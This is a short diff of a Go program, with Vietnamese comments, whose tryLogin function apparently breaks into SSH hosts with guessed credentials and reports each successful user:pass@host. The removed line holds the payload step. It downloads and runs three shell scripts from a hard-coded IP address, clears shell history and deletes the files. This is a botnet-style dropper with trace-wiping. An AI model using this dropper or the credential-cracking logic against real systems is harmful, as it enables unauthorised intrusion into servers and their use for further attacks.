@@ -64,7 +64,7 @@ func tryLogin(host, user, pass string) bool {
     }
 
     // Có đủ thông tin → coi là thành công thật
-	session.CombinedOutput(`cd /tmp ;busybox wget http://103.77.172.142/quang/w.sh; sh w.sh; curl http://103.77.172.142/quang/c.sh; sh c.sh; wget http://103.77.172.142/quang/wget.sh; sh wget.sh;history -c; rm -rf /tmp/w.sh /tmp/c.sh /tmp/wget.sh`)
+	
     fmt.Printf("[✔] Thành công: %s:%s@%s\n", user, pass, host)
     fmt.Println("→ Thông tin hệ thống:")
     fmt.Println(strings.TrimSpace(string(output)))
